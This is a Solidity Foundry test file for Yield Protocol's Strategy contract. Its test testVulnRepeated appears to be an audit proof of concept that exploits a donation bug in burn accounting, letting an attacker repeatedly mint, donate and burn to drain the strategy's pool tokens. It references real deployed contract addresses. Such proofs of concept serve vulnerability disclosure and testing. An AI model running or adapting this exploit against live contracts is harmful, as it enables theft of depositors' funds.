// SPDX-License-Identifier: BUSL-1.1
pragma solidity >=0.8.13;

import "forge-std/Test.sol";
import "forge-std/console2.sol";
import {Strategy, AccessControl} from "../src/Strategy.sol";
import {ICauldron} from "@yield-protocol/vault-v2/src/interfaces/ICauldron.sol";
import {ILadle} from "@yield-protocol/vault-v2/src/interfaces/ILadle.sol";
import {IFYToken} from "@yield-protocol/vault-v2/src/interfaces/IFYToken.sol";
import {IPool} from "@yield-protocol/yieldspace-tv/src/interfaces/IPool.sol";
import {IERC20} from "@yield-protocol/utils-v2/src/token/IERC20.sol";
import {IERC20Metadata} from "@yield-protocol/utils-v2/src/token/IERC20Metadata.sol";
import { TestConstants } from "./utils/TestConstants.sol";
import { TestExtensions } from "./utils/TestExtensions.sol";
import "@yield-protocol/vault-v2/src/interfaces/DataTypes.sol";

// Copied over from 'StrategyTest.t.sol'
abstract contract DeployedState is Test, TestConstants, TestExtensions {
    using stdStorage for StdStorage;

    // We use a custom tenderly fork with pools that are not initialized, but fyToken that have been added to the cauldron
    // Pools:
    //  0x303030390000 0xe2Cf890a20c022a034b2d89e6C573B68eD6feb70
    //  0x303130390000 0x304765A87fD5f28A87f2078A88a42a575b973FF0
    //  0x303230390000 0x8B4be6CD156CbD51Df8Fe603aD46DD3cd06A98d4
    //  0x313830390000 0x16123dDcb3fBcA9b962D51d4B7001148e8Ac3036

    address deployer = address(bytes20(keccak256("deployer")));
    address alice = address(bytes20(keccak256("alice")));
    address bob = address(bytes20(keccak256("bob")));
    address hole = address(bytes20(keccak256("hole")));

    address timelock = 0x3b870db67a45611CF4723d44487EAF398fAc51E3;
    ICauldron cauldron = ICauldron(0xc88191F8cb8e6D4a668B047c1C8503432c3Ca867);
    ILadle ladle = ILadle(0x6cB18fF2A33e981D1e38A663Ca056c0a5265066A);

    bytes6 seriesId;
    IPool pool;
    IFYToken fyToken;
    IERC20Metadata baseToken;
    IERC20Metadata sharesToken;
    Strategy strategy;

    function setUp() public virtual {
        vm.createSelectFork(UNIT_TESTS);

        seriesId = 0x313830390000;
        pool = IPool(0x16123dDcb3fBcA9b962D51d4B7001148e8Ac3036);
        fyToken = IFYToken(address(pool.fyToken())); // Future redemption of yield
        baseToken = pool.baseToken();
        sharesToken = pool.sharesToken();

        // Strategy V2
        strategy = new Strategy("StrategyTest.t.sol", "test", fyToken);

        // The strategy needs to be given permission to initalize the pool
        vm.prank(timelock);
        AccessControl(address(pool)).grantRole(IPool.init.selector, address(strategy));

        // Alice has privileged roles
        strategy.grantRole(Strategy.init.selector, alice);
        strategy.grantRole(Strategy.invest.selector, alice);
        strategy.grantRole(Strategy.eject.selector, alice);
        strategy.grantRole(Strategy.restart.selector, alice);
        strategy.grantRole(Strategy.call.selector, alice);

        vm.label(deployer, "deployer");
        vm.label(alice, "alice");
        vm.label(bob, "bob");
        vm.label(hole, "hole");
        vm.label(address(strategy), "strategy");
        vm.label(address(pool), "pool");
        vm.label(address(sharesToken), "sharesToken");
        vm.label(address(baseToken), "baseToken");
        vm.label(address(fyToken), "fyToken");
    }
}
abstract contract DivestedState is DeployedState {
    function setUp() public virtual override {
        super.setUp();
        uint256 initAmount = 100 * 10 ** baseToken.decimals();
        cash(baseToken, address(strategy), initAmount);

        vm.prank(alice);
        strategy.init(hole);
    }
}
abstract contract InvestedState is DivestedState {
    function setUp() public virtual override {
        super.setUp();
        vm.prank(alice);
        strategy.invest(pool);
    }
}

contract InvestedStateTest is InvestedState {

    /*
    Exploit code here in the test suite! 
    
    Start off with 0.02 of the pool. 
    End with 15 times the amount of the pool from the attack.
    */
    function testVulnRepeated() public {
        // Create pool tokens and send them to the strategy
        uint256 poolIn = pool.totalSupply() / 100; // Add in a 100th of the current supply
        cash(pool, bob, poolIn * 2); // Create the tokens to use
        vm.startPrank(bob);

        console.log("Strategy Starting Amount:", pool.balanceOf(address(strategy)));
        console.log("Pool starting amount:", pool.balanceOf(bob));

        // 196 is an arbitrary number from doing this dynamically and seeing it crash...
        while(true){
            //console2.log("=============================="); 
            //console2.log("=============================="); 
            //console2.log("=============================="); 

            //console.log("Pool starting amount:", pool.balanceOf(bob));

            /* 
            Divided by 2 seems to be the most efficient thing that I found for the split. This was from dynamic testing.
            */
            uint256 mintAmount = pool.balanceOf(bob) / 2;
            uint256 donationAmount =  pool.balanceOf(bob) / 2; 

            // Send the tokens to the strategy to mint
            pool.transfer(address(strategy), mintAmount);
            uint256 minted = strategy.mint(bob);

            // Vulnerability fun!
            // Sends tokens to the pool directly.
            // Causes a malfunction in the calculations for the 'burn' function.
            
            // Amount we expect to burn... even though this is insecure
            uint256 expectedBurn = strategy.balanceOf(bob) * (pool.balanceOf(address(strategy)) + donationAmount) / strategy.totalSupply(); 

            // If the amount we are trying to burn is smaller than what is in the pool, then only burn that.
            if(pool.balanceOf(address(strategy)) < expectedBurn){ // We are trying to burn more tokens than the pool has
                // TODO: Do math to find out HOW to take out the expected tokens

                // Get back the expected amount of tokens here
                strategy.transfer(address(strategy), minted); 
                uint256 amountBurned = strategy.burn(bob);
                break; 
            }
            else{

                // Donation attack vulnerability
                pool.transfer(address(strategy), donationAmount);

                // Expected burn
                //console2.log("Expected burn (vuln):", strategy.balanceOf(bob) * pool.balanceOf(address(strategy)) / strategy.totalSupply()); 
                //console2.log("Intended burn: ", strategy.balanceOf(bob) * strategy.poolCached() / strategy.totalSupply()); 
                //console.log("Broke at iteration", i);

                // Transfer the strategy tokens back in order to burn them
                strategy.transfer(address(strategy), minted); 
                uint256 amountBurned = strategy.burn(bob);
                //console2.log("Pool tokens received:", amountBurned);
                //console.log("Pool token final balance:", pool.balanceOf(bob));

                uint256 donationMints = strategy.mint(bob); 

                // Obtain the tokens back!
                //console.log("Donation mints:", donationMints); 

                // Setup the transfer back
                strategy.transfer(address(strategy), donationMints);
                uint256 secondBurnAmount = strategy.burn(bob); 
                //console2.log("Pool tokens received after second burn:", secondBurnAmount);
                //console.log("Pool token final balance:", pool.balanceOf(bob));
                //console.log("Strategy Amount Remaining:", pool.balanceOf(address(strategy)));
            }
        }

        console2.log("=============================="); 
        console2.log("=============================="); 
        console2.log("=============================="); 
        console.log("Strategy Pool Token Remaining:", pool.balanceOf(address(strategy)));
        console.log("Bob Pool token final balance:", pool.balanceOf(bob));
    }
}
